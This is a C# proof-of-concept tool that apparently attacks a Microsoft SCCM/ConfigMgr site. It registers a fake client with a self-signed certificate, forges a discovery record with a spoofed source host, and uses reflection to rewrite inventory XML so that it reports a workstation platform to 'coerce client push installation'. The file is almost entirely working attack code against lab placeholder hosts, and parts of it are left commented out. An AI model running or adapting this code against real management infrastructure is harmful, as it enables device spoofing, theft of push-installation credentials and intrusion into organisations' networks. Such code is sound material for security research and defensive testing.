using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using System.Xml.Serialization;
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace RegisterClient
{
    class Program
    {
        static MessageCertificateX509 CreateCertificate()
        {
            // Generate certificate for signing and encrypting messages
            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
            return certificate;
        }
        static SmsClientId RegisterClient(MessageCertificateX509 certificate, string clientFqdn, string netBiosName, string managementPoint, string siteCode)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Create a registration request
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();

            // Add our certificate for message signing
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);

            // Discover local properties for client registration request
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();

            // Modify properties
            registrationRequest.AgentIdentity = "CcmExec.exe";
            registrationRequest.ClientFqdn = clientFqdn;
            Console.WriteLine($"  ClientFqdn: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            registrationRequest.NetBiosName = netBiosName;
            Console.WriteLine($"  NetBiosName: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");

            // Serialize message XML and display to user
            registrationRequest.SerializeMessageBody();
            Console.WriteLine($"\nBody:\n  { registrationRequest.Body}"); // Raw XML message body

            // Register client and wait for a confirmation with the SMSID
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
            Console.WriteLine($"[+] Received unique GUID for new device: {clientId.ToString()}");
            return clientId;
        }

        static void SendDDR(MessageCertificateX509 certificate, string clientFqdn, string netBiosName, string managementPoint, string siteCode, SmsClientId clientId)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();

            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);

            // Discover local properties for DDR inventory report
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            ddrMessage.Discover(); // This is required to generate the inventory report XML

            // Modify properties
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
            ddrMessage.Settings.SourceHost = netBiosName;
            ddrMessage.NetBiosName = netBiosName;
            ddrMessage.SiteCode = siteCode;
            ddrMessage.SerializeMessageBody(); // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body

            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = netBiosName;

            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            //string modifiedDdrBodyXml = ddrBodyXml.Replace("<ClientInstalled>1</ClientInstalled>", "<ClientInstalled>0</ClientInstalled>");
            //MessageBody modifiedDdrBody = new MessageBody(modifiedDdrBodyXml);
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            //typeof(ConfigMgrDataDiscoveryRecordMessage).GetProperty("Body").SetValue(ddrMessage.Body, ddrBodyXml);

            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, netBiosName);
            XmlDocument xmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            xmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            XmlNode platformId = xmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformId.InnerXml}");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            platformId.InnerText = "Microsoft Windows NT Workstation 2010.0";
            XmlNode modifiedXml = xmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);

            // Display XML to user
            Console.WriteLine($"\nDDR Body:\n  {ddrMessage.Body}");
            Console.WriteLine($"\nInventory Report Body:\n  {ddrMessage.InventoryReport.ReportBody.RawXml}");

            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            //ddrMessage.Validate(sender);
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} spoofing {ddrMessage.Settings.SourceHost} and requesting reply to {ddrMessage.Settings.ReplyEndpoint}");
            //ddrMessage.SendMessage(sender);
        }

        static void Main(string[] args)
        {
            // User-defined vars
            string clientFqdn = "testing.aperture.science";
            string netBiosName = "testing";
            string managementPoint = "atlas.aperture.science";
            string siteCode = "PS1";

            // Add admin check here -- seems to be required to create a certificate
            MessageCertificateX509 certificate = CreateCertificate();
            //SmsClientId clientId = RegisterClient(certificate, clientFqdn, netBiosName, managementPoint, siteCode);
            SmsClientId clientId = new SmsClientId("GUID:C9EA062A-46D6-4306-9FEB-9E842DA72CD1");
            SendDDR(certificate, clientFqdn, netBiosName, managementPoint, siteCode, clientId);

            /*
            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
            ddrMessage.Discover();
            ddrMessage.IncludeMachinePublicKey = true;
            ddrMessage.InventoryReport = ddrMessage.BuildInventoryMessage(ddrMessage.DdrInstances);
            //Console.WriteLine($"[+] Discovered data:");
            //Console.WriteLine(ddrMessage.InventoryReport.ReportBody.RawXml);

            // Update message settings with new device information
            ddrMessage.Settings.SourceHost = "test-yo";
            ddrMessage.Settings.Compression = MessageCompression.Zlib;

            foreach (KeyValuePair<string, SenderConfigurationProperty> kvp in ddrMessage.Settings.SenderProperties)
            {
                Console.WriteLine($"Key: {kvp.Key}\nValue: {kvp.Value}");
                Console.WriteLine(kvp.Value.SenderPropertyName);
                Console.WriteLine(kvp.Value.SenderName);
                Console.WriteLine(kvp.Value.Value);
            }




            // Modify DDR XML
            //string xmlData = "<?xml version=\"1.0\"?><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_ExtNetworkAdapterConfiguration\" ParentClass=\"CCM_ExtNetworkAdapterConfiguration\"><CCM_ExtNetworkAdapterConfiguration><FQDN>test-yo.local</FQDN></CCM_ExtNetworkAdapterConfiguration></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_DiscoveryData\" ParentClass=\"CCM_DiscoveryData\"><CCM_DiscoveryData><PlatformID>Microsoft Windows NT Workstation 2010.0</PlatformID></CCM_DiscoveryData></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_NetworkAdapterConfiguration\" ParentClass=\"CCM_NetworkAdapterConfiguration\"><CCM_NetworkAdapterConfiguration><IPSubnet>192.168.57.0</IPSubnet><IPSubnet>254.128.0.0</IPSubnet></CCM_NetworkAdapterConfiguration></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"Win32_NetworkAdapterConfiguration\" ParentClass=\"Win32_NetworkAdapterConfiguration\"><Win32_NetworkAdapterConfiguration><IPAddress>192.168.57.101</IPAddress><IPAddress>fe80::9d04:12d5:b6cd:c139</IPAddress><Index>1</Index><MACAddress>00:50:56:2B:CD:37</MACAddress></Win32_NetworkAdapterConfiguration></Instance>";
            string xmlData = ddrMessage.InventoryReport.ReportBody.RawXml;
            xmlData = xmlData.Replace(ddrMessage.Settings.SourceHost.ToString(), "test-yo");
            XmlDocument xmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            xmlDoc.LoadXml("<root>" + xmlData + "</root>");
            XmlNode platformId = xmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformId.InnerXml}");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            platformId.InnerText = "Microsoft Windows NT Workstation 2010.0";
            XmlNode modifiedXml = xmlDoc.SelectSingleNode("//root");
            xmlData = modifiedXml.InnerXml;

            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, xmlData);
            //Console.WriteLine($"[+] Modified data:");
            //Console.WriteLine(ddrMessage.InventoryReport.ReportBody.RawXml);


            // Assemble message and send
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.Settings.HostName = "atlas.aperture.science";
            //ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            ddrMessage.SmsId = new SmsClientId("GUID:B5ACDB33-B135-4270-92EB-D09A739D3535");
            ddrMessage.SiteCode = "PS1";
            //ddrMessage.Validate(sender);
            Console.WriteLine($"[+] Sending DDR to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName} spoofing {ddrMessage.Settings.SourceHost} and requesting reply to {ddrMessage.Settings.ReplyEndpoint}");
            ddrMessage.SendMessage(sender);

            // Need to dispose of cert when done?
            */
        }
    }
}
